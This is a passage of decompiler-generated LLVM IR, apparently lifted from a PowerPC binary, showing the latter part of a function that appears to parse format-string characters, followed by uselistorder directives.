  %v3_1000f0c0 = zext i8 %v2_1000f0c0 to i32
  store i32 %v3_1000f0c0, i32* %r0.global-to-local, align 4
  %v4_1000f0c4 = icmp eq i8 %v2_1000f0c0, %v2_1000f08c
  br i1 %v4_1000f0c4, label %dec_label_pc_1000f0cc, label %dec_label_pc_1000f124

dec_label_pc_1000f0cc:                            ; preds = %dec_label_pc_1000f0c0
  %v2_1000f0cc = sub i32 %v1_1000f0cc, ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32)
  %tmp61 = icmp slt i32 %v2_1000f0cc, 18
  %brmerge = or i1 %v3_1000f0a4, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000f0e0, label %dec_label_pc_1000f0dc

dec_label_pc_1000f0dc:                            ; preds = %dec_label_pc_1000f0cc
  %v1_1000f0dc = add i32 %v2_1000f0cc, -2
  br label %dec_label_pc_1000f0e0

dec_label_pc_1000f0e0:                            ; preds = %dec_label_pc_1000f0cc, %dec_label_pc_1000f0dc
  %storemerge = phi i32 [ %v1_1000f0dc, %dec_label_pc_1000f0dc ], [ %v2_1000f0cc, %dec_label_pc_1000f0cc ]
  %v0_1000f0e0 = phi i32 [ %v1_1000f0dc, %dec_label_pc_1000f0dc ], [ %v2_1000f0cc, %dec_label_pc_1000f0cc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000f0e0 = load i32, i32* @r28, align 4
  %v2_1000f0e0 = add i32 %v1_1000f0e0, 32
  %v3_1000f0e0 = inttoptr i32 %v2_1000f0e0 to i32*
  store i32 %v0_1000f0e0, i32* %v3_1000f0e0, align 4
  store i32 ptrtoint (i32* @global_var_1001b2db.1056 to i32), i32* %r11.global-to-local, align 4
  %v0_1000f0ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0e8

dec_label_pc_1000f0e8:                            ; preds = %dec_label_pc_1000f0e8, %dec_label_pc_1000f0e0
  %v0_1000f0e8 = phi i32 [ %v1_1000f0e8, %dec_label_pc_1000f0e8 ], [ ptrtoint (i32* @global_var_1001b2db.1056 to i32), %dec_label_pc_1000f0e0 ]
  %v1_1000f0e8 = add i32 %v0_1000f0e8, 1
  %v2_1000f0e8 = inttoptr i32 %v1_1000f0e8 to i8*
  %v3_1000f0e8 = load i8, i8* %v2_1000f0e8, align 1
  %v4_1000f0e8 = zext i8 %v3_1000f0e8 to i32
  store i32 %v4_1000f0e8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f0e8, i32* %r11.global-to-local, align 4
  %v3_1000f0ec = icmp sgt i32 %v0_1000f0ec.pre, %v4_1000f0e8
  br i1 %v3_1000f0ec, label %dec_label_pc_1000f0e8, label %dec_label_pc_1000f0f4

dec_label_pc_1000f0f4:                            ; preds = %dec_label_pc_1000f0e8
  %v0_1000f0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f0f4 = sub i32 %v1_1000f0e8, %v0_1000f0f4
  %v1_1000f0fc = mul i32 %v2_1000f0f4, 2
  store i32 %v1_1000f0fc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001b2cc.1057 to i32), i32* %r9.global-to-local, align 4
  %v2_1000f104 = add i32 %v1_1000f0fc, ptrtoint (i32* @global_var_1001b2cc.1057 to i32)
  %v3_1000f104 = inttoptr i32 %v2_1000f104 to i16*
  %v4_1000f104 = load i16, i16* %v3_1000f104, align 2
  %v5_1000f104 = sext i16 %v4_1000f104 to i32
  store i32 %v5_1000f104, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001b2bc.1058 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32), i32* %r8.global-to-local, align 4
  %v2_1000f114 = add i32 %v1_1000f0fc, ptrtoint (i32* @global_var_1001b2bc.1058 to i32)
  %v3_1000f114 = inttoptr i32 %v2_1000f114 to i16*
  %v4_1000f114 = load i16, i16* %v3_1000f114, align 2
  %v5_1000f114 = sext i16 %v4_1000f114 to i32
  store i32 %v5_1000f114, i32* %r9.global-to-local, align 4
  %v2_1000f118 = or i32 %v5_1000f104, %v1_1000f098
  store i32 %v2_1000f118, i32* %r0.global-to-local, align 4
  %v2_1000f11c = and i32 %v5_1000f114, %v2_1000f118
  store i32 %v2_1000f11c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f130

dec_label_pc_1000f124:                            ; preds = %dec_label_pc_1000f0c0
  %v1_1000f124 = add i32 %v1_1000f0cc, 1
  %v2_1000f124 = inttoptr i32 %v1_1000f124 to i8*
  %v3_1000f124 = load i8, i8* %v2_1000f124, align 1
  %v4_1000f124 = zext i8 %v3_1000f124 to i32
  store i32 %v4_1000f124, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f124, i32* %r8.global-to-local, align 4
  %v3_1000f128 = icmp eq i8 %v3_1000f124, 0
  br i1 %v3_1000f128, label %dec_label_pc_1000f130, label %dec_label_pc_1000f0c0

dec_label_pc_1000f130:                            ; preds = %dec_label_pc_1000f124, %dec_label_pc_1000f0f4
  %v0_1000f130 = phi i32 [ %v2_1000f11c, %dec_label_pc_1000f0f4 ], [ %v3_1000f0b0, %dec_label_pc_1000f124 ]
  store i32 %v0_1000f130, i32* %stack_var_-96, align 4
  %v0_1000f134 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f134 = call i32 @__asm_rlwinm(i32 %v0_1000f134, i32 30, i32 31, i32 31)
  %not.v2_1000f138 = icmp eq i32 %v1_1000f134, 0
  %v6_1000f13c = sext i1 %not.v2_1000f138 to i32
  store i32 %v6_1000f13c, i32* %r9.global-to-local, align 4
  %v1_1000f140 = call i32 @__asm_rlwinm(i32 %v1_1000f098, i32 0, i32 20, i32 23)
  store i32 %v1_1000f140, i32* %r0.global-to-local, align 4
  %v1_1000f144 = call i32 @__asm_rlwinm(i32 %v6_1000f13c, i32 0, i32 0, i32 27)
  store i32 %v1_1000f144, i32* %r9.global-to-local, align 4
  %v0_1000f148 = load i32, i32* @r30, align 4
  %v1_1000f148 = inttoptr i32 %v0_1000f148 to i8*
  %v2_1000f148 = load i8, i8* %v1_1000f148, align 1
  %v3_1000f148 = zext i8 %v2_1000f148 to i32
  store i32 %v3_1000f148, i32* %r10.global-to-local, align 4
  %v0_1000f14c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f14c = call i32 @__asm_rlwinm(i32 %v0_1000f14c, i32 0, i32 30, i32 28)
  %v1_1000f150 = add i32 %v1_1000f144, 48
  store i32 %v1_1000f150, i32* %r9.global-to-local, align 4
  %v2_1000f154 = or i32 %v1_1000f14c, %v1_1000f140
  store i32 %v2_1000f154, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1000f15c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f15c = load i32, i32* @r28, align 4
  %v2_1000f15c = add i32 %v1_1000f15c, 12
  %v3_1000f15c = inttoptr i32 %v2_1000f15c to i32*
  store i32 %v0_1000f15c, i32* %v3_1000f15c, align 4
  %v0_1000f160 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f160 = load i32, i32* @r28, align 4
  %v2_1000f160 = add i32 %v1_1000f160, 4
  %v3_1000f160 = inttoptr i32 %v2_1000f160 to i32*
  store i32 %v0_1000f160, i32* %v3_1000f160, align 4
  %v0_1000f164 = load i32, i32* @r31, align 4
  %v1_1000f164 = load i32, i32* @r28, align 4
  %v2_1000f164 = add i32 %v1_1000f164, 8
  %v3_1000f164 = inttoptr i32 %v2_1000f164 to i32*
  store i32 %v0_1000f164, i32* %v3_1000f164, align 4
  %v0_1000f168 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f168 = load i32, i32* @r28, align 4
  %v2_1000f168 = add i32 %v1_1000f168, 20
  %v3_1000f168 = inttoptr i32 %v2_1000f168 to i32*
  store i32 %v0_1000f168, i32* %v3_1000f168, align 4
  %v0_1000f16c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f16c = load i32, i32* @r28, align 4
  %v2_1000f16c = add i32 %v1_1000f16c, 16
  %v3_1000f16c = inttoptr i32 %v2_1000f16c to i32*
  store i32 %v0_1000f16c, i32* %v3_1000f16c, align 4
  %v0_1000f170 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f170 = load i32, i32* @r28, align 4
  %v2_1000f170 = add i32 %v1_1000f170, 28
  %v3_1000f170 = inttoptr i32 %v2_1000f170 to i32*
  store i32 %v0_1000f170, i32* %v3_1000f170, align 4
  %v0_1000f174 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f174 = inttoptr i32 %v0_1000f174 to i8*
  %v2_1000f174 = load i8, i8* %v1_1000f174, align 1
  %v3_1000f174 = zext i8 %v2_1000f174 to i32
  store i32 %v3_1000f174, i32* %r9.global-to-local, align 4
  %v3_1000f178 = icmp eq i8 %v2_1000f174, 0
  br i1 %v3_1000f178, label %dec_label_pc_1000f180, label %dec_label_pc_1000f198

dec_label_pc_1000f180:                            ; preds = %dec_label_pc_1000f130
  %v0_1000f180 = load i32, i32* @r30, align 4
  %v1_1000f180 = inttoptr i32 %v0_1000f180 to i8*
  %v2_1000f180 = load i8, i8* %v1_1000f180, align 1
  %v3_1000f180 = zext i8 %v2_1000f180 to i32
  store i32 %v3_1000f180, i32* %r0.global-to-local, align 4
  %v3_1000f184 = icmp eq i8 %v2_1000f180, 109
  br i1 %v3_1000f184, label %dec_label_pc_1000f18c, label %dec_label_pc_1000f2d0

dec_label_pc_1000f18c:                            ; preds = %dec_label_pc_1000f180
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000f190 = load i32, i32* @r28, align 4
  %v2_1000f190 = add i32 %v1_1000f190, 28
  %v3_1000f190 = inttoptr i32 %v2_1000f190 to i32*
  store i32 %v3_1000f174, i32* %v3_1000f190, align 4
  %v0_1000f194 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f194 = load i32, i32* @r28, align 4
  %v2_1000f194 = add i32 %v1_1000f194, 32
  %v3_1000f194 = inttoptr i32 %v2_1000f194 to i32*
  store i32 %v0_1000f194, i32* %v3_1000f194, align 4
  br label %dec_label_pc_1000f198

dec_label_pc_1000f198:                            ; preds = %dec_label_pc_1000f130, %dec_label_pc_1000f18c
  %v0_1000f198 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000f198, 1
  br i1 %tmp62, label %dec_label_pc_1000f274, label %dec_label_pc_1000f1a0

dec_label_pc_1000f1a0:                            ; preds = %dec_label_pc_1000f198
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000f1a4

dec_label_pc_1000f1a4:                            ; preds = %dec_label_pc_1000f25c, %dec_label_pc_1000f1a0
  %v0_1000f1cc = phi i32 [ 0, %dec_label_pc_1000f1a0 ], [ %v1_1000f260, %dec_label_pc_1000f25c ]
  %v2_1000f1a4 = icmp sgt i32 %v0_1000f1cc, 2
  br i1 %v2_1000f1a4, label %dec_label_pc_1000f1c8, label %dec_label_pc_1000f1ac

dec_label_pc_1000f1ac:                            ; preds = %dec_label_pc_1000f1a4
  %v1_1000f1ac = mul i32 %v0_1000f1cc, 4
  store i32 %v1_1000f1ac, i32* %r0.global-to-local, align 4
  %v0_1000f1b0 = load i32, i32* @r1, align 4
  %v2_1000f1b0 = add i32 %v0_1000f1b0, %v1_1000f1ac
  store i32 %v2_1000f1b0, i32* %r9.global-to-local, align 4
  %v1_1000f1b4 = add i32 %v2_1000f1b0, 20
  %v2_1000f1b4 = inttoptr i32 %v1_1000f1b4 to i32*
  %v3_1000f1b4 = load i32, i32* %v2_1000f1b4, align 4
  store i32 %v3_1000f1b4, i32* %r0.global-to-local, align 4
  %v1_1000f1b8 = load i32, i32* @r28, align 4
  %v2_1000f1b8 = add i32 %v1_1000f1b8, %v0_1000f1cc
  store i32 %v2_1000f1b8, i32* %r9.global-to-local, align 4
  %v1_1000f1bc = urem i32 %v3_1000f1b4, 256
  store i32 %v1_1000f1bc, i32* %r11.global-to-local, align 4
  %v1_1000f1c0 = trunc i32 %v3_1000f1b4 to i8
  %v3_1000f1c0 = add i32 %v2_1000f1b8, 36
  %v4_1000f1c0 = inttoptr i32 %v3_1000f1c0 to i8*
  store i8 %v1_1000f1c0, i8* %v4_1000f1c0, align 1
  %v0_1000f1d4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f1d4

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1a4
  %v2_1000f1cc = add i32 %v0_1000f1cc, %stack_var_-84.3
  store i32 %v2_1000f1cc, i32* %r9.global-to-local, align 4
  %v1_1000f1d0 = add i32 %v2_1000f1cc, -2
  store i32 %v1_1000f1d0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f1d4

dec_label_pc_1000f1d4:                            ; preds = %dec_label_pc_1000f1ac, %dec_label_pc_1000f1c8
  %v0_1000f1f4 = phi i32 [ %v0_1000f1d4.pre, %dec_label_pc_1000f1ac ], [ %v1_1000f1d0, %dec_label_pc_1000f1c8 ]
  %v1_1000f1d4 = load i32, i32* @r26, align 4
  %v3_1000f1d4 = icmp sgt i32 %v0_1000f1f4, %v1_1000f1d4
  br i1 %v3_1000f1d4, label %dec_label_pc_1000f1dc, label %dec_label_pc_1000f1e8

dec_label_pc_1000f1dc:                            ; preds = %dec_label_pc_1000f1d4
  %v2_1000f1dc = icmp sgt i32 %v0_1000f1f4, 9
  br i1 %v2_1000f1dc, label %dec_label_pc_1000f2d0, label %dec_label_pc_1000f1e4

dec_label_pc_1000f1e4:                            ; preds = %dec_label_pc_1000f1dc
  store i32 %v0_1000f1f4, i32* @r26, align 4
  br label %dec_label_pc_1000f1e8

dec_label_pc_1000f1e8:                            ; preds = %dec_label_pc_1000f1d4, %dec_label_pc_1000f1e4
  store i32 %v2_1000ee84.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000f1ec = load i32, i32* @r27, align 4
  %v1_1000f1ec = mul i32 %v0_1000f1ec, 4
  store i32 %v1_1000f1ec, i32* %r0.global-to-local, align 4
  %v2_1000f1f0 = add i32 %v1_1000f1ec, %v2_1000ee84.pre-phi
  %v3_1000f1f0 = inttoptr i32 %v2_1000f1f0 to i32*
  %v4_1000f1f0 = load i32, i32* %v3_1000f1f0, align 4
  store i32 %v4_1000f1f0, i32* @r31, align 4
  %v1_1000f1f4 = add i32 %v0_1000f1f4, -1
  store i32 %v1_1000f1f4, i32* @r25, align 4
  %v1_1000f1f8 = mul i32 %v1_1000f1f4, 4
  %v3_1000f1fc = icmp eq i32 %v4_1000f1f0, 8
  %v1_1000f200 = load i32, i32* @r28, align 4
  %v2_1000f200 = add i32 %v1_1000f200, %v1_1000f1f8
  store i32 %v2_1000f200, i32* %r9.global-to-local, align 4
  %v1_1000f204 = add i32 %v2_1000f200, 40
  %v2_1000f204 = inttoptr i32 %v1_1000f204 to i32*
  %v3_1000f204 = load i32, i32* %v2_1000f204, align 4
  store i32 %v3_1000f204, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f1fc, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f20c

dec_label_pc_1000f20c:                            ; preds = %dec_label_pc_1000f1e8
  %v3_1000f20c = icmp eq i32 %v3_1000f204, 8
  br i1 %v3_1000f20c, label %dec_label_pc_1000f244, label %dec_label_pc_1000f214

dec_label_pc_1000f214:                            ; preds = %dec_label_pc_1000f20c
  %v4_1000f214 = icmp eq i32 %v3_1000f204, %v4_1000f1f0
  br i1 %v4_1000f214, label %dec_label_pc_1000f244, label %dec_label_pc_1000f21c

dec_label_pc_1000f21c:                            ; preds = %dec_label_pc_1000f214
  %v1_1000f21c = call i32 @_promoted_size(i32 %v3_1000f204)
  store i32 %v1_1000f21c, i32* @r29, align 4
  %v0_1000f224 = load i32, i32* @r31, align 4
  store i32 %v0_1000f224, i32* %r3.global-to-local, align 4
  %v1_1000f228 = call i32 @_promoted_size(i32 %v0_1000f224)
  store i32 %v1_1000f228, i32* %r3.global-to-local, align 4
  %v0_1000f234 = call i32 @__asm_mfcr()
  store i32 %v0_1000f234, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f234, i32* %r0.global-to-local, align 4
  %v1_1000f238 = call i32 @__asm_rlwinm(i32 %v0_1000f234, i32 31, i32 31, i32 31)
  store i32 %v1_1000f238, i32* %r0.global-to-local, align 4
  %v3_1000f23c = icmp eq i32 %v1_1000f238, 0
  br i1 %v3_1000f23c, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge

dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge: ; preds = %dec_label_pc_1000f21c
  %v0_1000f248.pre = load i32, i32* @r27, align 4
  %v0_1000f250.pre = load i32, i32* @r25, align 4
  %v1_1000f254.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f244

dec_label_pc_1000f244:                            ; preds = %dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge, %dec_label_pc_1000f214, %dec_label_pc_1000f20c
  %v1_1000f254 = phi i32 [ %v1_1000f254.pre, %dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge ], [ %v1_1000f200, %dec_label_pc_1000f214 ], [ %v1_1000f200, %dec_label_pc_1000f20c ]
  %v0_1000f250 = phi i32 [ %v0_1000f250.pre, %dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge ], [ %v1_1000f1f4, %dec_label_pc_1000f214 ], [ %v1_1000f1f4, %dec_label_pc_1000f20c ]
  %v0_1000f248 = phi i32 [ %v0_1000f248.pre, %dec_label_pc_1000f21c.dec_label_pc_1000f244_crit_edge ], [ %v0_1000f1ec, %dec_label_pc_1000f214 ], [ %v0_1000f1ec, %dec_label_pc_1000f20c ]
  store i32 %v2_1000ee84.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000f248 = mul i32 %v0_1000f248, 4
  store i32 %v1_1000f248, i32* %r0.global-to-local, align 4
  %v2_1000f24c = add i32 %v1_1000f248, %v2_1000ee84.pre-phi
  %v3_1000f24c = inttoptr i32 %v2_1000f24c to i32*
  %v4_1000f24c = load i32, i32* %v3_1000f24c, align 4
  store i32 %v4_1000f24c, i32* %r0.global-to-local, align 4
  %v1_1000f250 = mul i32 %v0_1000f250, 4
  %v2_1000f254 = add i32 %v1_1000f250, %v1_1000f254
  store i32 %v2_1000f254, i32* %r9.global-to-local, align 4
  %v2_1000f258 = add i32 %v2_1000f254, 40
  %v3_1000f258 = inttoptr i32 %v2_1000f258 to i32*
  store i32 %v4_1000f24c, i32* %v3_1000f258, align 4
  br label %dec_label_pc_1000f25c

dec_label_pc_1000f25c:                            ; preds = %dec_label_pc_1000f21c, %dec_label_pc_1000f1e8, %dec_label_pc_1000f244
  %v0_1000f25c = load i32, i32* @r28, align 4
  %v1_1000f25c = add i32 %v0_1000f25c, 28
  %v2_1000f25c = inttoptr i32 %v1_1000f25c to i32*
  %v3_1000f25c = load i32, i32* %v2_1000f25c, align 4
  %v0_1000f260 = load i32, i32* @r27, align 4
  %v1_1000f260 = add i32 %v0_1000f260, 1
  store i32 %v1_1000f260, i32* @r27, align 4
  %v1_1000f264 = add i32 %v3_1000f25c, 2
  store i32 %v1_1000f264, i32* %r9.global-to-local, align 4
  %v2_1000f268 = icmp slt i32 %v1_1000f260, %v1_1000f264
  br i1 %v2_1000f268, label %dec_label_pc_1000f1a4, label %dec_label_pc_1000f28c

dec_label_pc_1000f274:                            ; preds = %dec_label_pc_1000f198
  %v0_1000f274 = load i32, i32* @r28, align 4
  %v1_1000f274 = add i32 %v0_1000f274, 28
  %v2_1000f274 = inttoptr i32 %v1_1000f274 to i32*
  %v3_1000f274 = load i32, i32* %v2_1000f274, align 4
  store i32 %v3_1000f274, i32* %r5.global-to-local, align 4
  %v1_1000f278 = add i32 %v0_1000f274, 40
  store i32 %v1_1000f278, i32* @r3, align 4
  %v0_1000f27c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f27c = trunc i32 %v0_1000f27c to i8
  %v3_1000f27c = add i32 %v0_1000f274, 38
  %v4_1000f27c = inttoptr i32 %v3_1000f27c to i8*
  store i8 %v1_1000f27c, i8* %v4_1000f27c, align 1
  %v2_1000f280 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000f280, i32* @r4, align 4
  %v0_1000f284 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f284 = mul i32 %v0_1000f284, 4
  store i32 %v1_1000f284, i32* @r5, align 4
  store i32 268497548, i32* @lr, align 4
  %v0_1000f288 = call i32 @memcpy()
  store i32 %v0_1000f288, i32* %r3.global-to-local, align 4
  %v0_1000f28c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f28c

dec_label_pc_1000f28c:                            ; preds = %dec_label_pc_1000f25c, %dec_label_pc_1000f274
  %v0_1000f28c = phi i32 [ %v0_1000f28c.pre, %dec_label_pc_1000f274 ], [ %v0_1000f25c, %dec_label_pc_1000f25c ]
  %v1_1000f28c = add i32 %v0_1000f28c, 16
  %v2_1000f28c = inttoptr i32 %v1_1000f28c to i32*
  %v3_1000f28c = load i32, i32* %v2_1000f28c, align 4
  store i32 %v3_1000f28c, i32* %r0.global-to-local, align 4
  %v0_1000f290 = load i32, i32* @r26, align 4
  %v2_1000f290 = add i32 %v0_1000f28c, 24
  %v3_1000f290 = inttoptr i32 %v2_1000f290 to i32*
  store i32 %v0_1000f290, i32* %v3_1000f290, align 4
  %v0_1000f294 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f294 = and i32 %v0_1000f294, 128
  store i32 %v1_1000f294, i32* %r9.global-to-local, align 4
  %v3_1000f294 = icmp eq i32 %v1_1000f294, 0
  br i1 %v3_1000f294, label %dec_label_pc_1000f29c, label %dec_label_pc_1000f2a8

dec_label_pc_1000f29c:                            ; preds = %dec_label_pc_1000f28c
  %v0_1000f29c = load i32, i32* @r30, align 4
  %v1_1000f29c = add i32 %v0_1000f29c, 1
  store i32 %v1_1000f29c, i32* %r0.global-to-local, align 4
  %v1_1000f2a0 = load i32, i32* @r28, align 4
  %v2_1000f2a0 = inttoptr i32 %v1_1000f2a0 to i32*
  store i32 %v1_1000f29c, i32* %v2_1000f2a0, align 4
  br label %dec_label_pc_1000f2c0

dec_label_pc_1000f2a8:                            ; preds = %dec_label_pc_1000f28c
  %v2_1000f2a8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000f2a8, i32* %r0.global-to-local, align 4
  %v0_1000f2ac = load i32, i32* @r28, align 4
  %v1_1000f2ac = inttoptr i32 %v0_1000f2ac to i32*
  %v2_1000f2ac = load i32, i32* %v1_1000f2ac, align 4
  %v1_1000f2b0 = load i32, i32* @r30, align 4
  %v2_1000f2b0 = sub i32 %v1_1000f2b0, %v2_1000f2a8
  %v1_1000f2b4 = mul i32 %v2_1000f2b0, 4
  store i32 %v1_1000f2b4, i32* %r0.global-to-local, align 4
  %v2_1000f2b8 = add i32 %v1_1000f2b4, %v2_1000f2ac
  store i32 %v2_1000f2b8, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f2b8, i32* %v1_1000f2ac, align 4
  br label %dec_label_pc_1000f2c0

dec_label_pc_1000f2c0:                            ; preds = %dec_label_pc_1000f29c, %dec_label_pc_1000f2a8
  %v0_1000f2c0 = load i32, i32* @r28, align 4
  %v1_1000f2c0 = add i32 %v0_1000f2c0, 28
  %v2_1000f2c0 = inttoptr i32 %v1_1000f2c0 to i32*
  %v3_1000f2c0 = load i32, i32* %v2_1000f2c0, align 4
  store i32 %v3_1000f2c0, i32* %r9.global-to-local, align 4
  %v1_1000f2c4 = add i32 %v3_1000f2c0, 2
  br label %dec_label_pc_1000f2d0

dec_label_pc_1000f2d0:                            ; preds = %dec_label_pc_1000ee34, %dec_label_pc_1000ef08, %dec_label_pc_1000efe4, %dec_label_pc_1000efd8, %dec_label_pc_1000f000, %dec_label_pc_1000ef3c, %dec_label_pc_1000f1dc, %dec_label_pc_1000f08c, %dec_label_pc_1000f180, %dec_label_pc_1000f2c0
  %storemerge2 = phi i32 [ %v1_1000f2c4, %dec_label_pc_1000f2c0 ], [ -1, %dec_label_pc_1000f180 ], [ -1, %dec_label_pc_1000f08c ], [ -1, %dec_label_pc_1000f1dc ], [ -1, %dec_label_pc_1000ef3c ], [ -1, %dec_label_pc_1000f000 ], [ -1, %dec_label_pc_1000efd8 ], [ -1, %dec_label_pc_1000efe4 ], [ -1, %dec_label_pc_1000ef08 ], [ -1, %dec_label_pc_1000ee34 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000edcc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000f2b4, { 1, 0 }
  uselistorder i32 %v0_1000f28c, { 1, 0 }
  uselistorder i32 %v1_1000f260, { 1, 2, 0 }
  uselistorder i32 %v1_1000f248, { 1, 0 }
  uselistorder i32 %v0_1000f234, { 0, 2, 1 }
  uselistorder i32 %v3_1000f204, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000f200, { 1, 2, 0 }
  uselistorder i32 %v1_1000f1f4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f1ec, { 1, 0 }
  uselistorder i32 %v0_1000f1ec, { 1, 2, 0 }
  uselistorder i32 %v3_1000f1b4, { 1, 0, 2 }
  uselistorder i32 %v1_1000f1ac, { 1, 0 }
  uselistorder i32 %v0_1000f1cc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f124, { 1, 2, 0 }
  uselistorder i32 %v1_1000f0fc, { 2, 1, 0 }
  uselistorder i32 %v1_1000f0e8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f0cc, { 1, 0, 2 }
  uselistorder i32 %v1_1000f098, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000f054, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000f018, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000f004, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000ef74, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000ef70, { 1, 0 }
  uselistorder i32 %v0_1000ef88, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000eeec, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000eee4, { 1, 0 }
  uselistorder i32 %v1_1000eed4, { 1, 0 }
  uselistorder i32 %v3_1000eecc, { 1, 0, 2 }
  uselistorder i32 %v0_1000ef48, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000ef18, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000eea8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000ee90, { 1, 0 }
  uselistorder i32 %v2_1000ee84.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000ee64, { 1, 0 }
  uselistorder i32 %v1_1000ee4c, { 1, 2, 0 }
  uselistorder i32 %v0_1000ee40, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1001b2e8.1054 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1001b2a8.1053 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f2d0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000f2c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f28c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f25c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f1e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f198, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f08c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f03c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f010, { 1, 0 }
  uselistorder label %dec_label_pc_1000efc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000efc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef34, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef2c, { 2, 1, 0 }
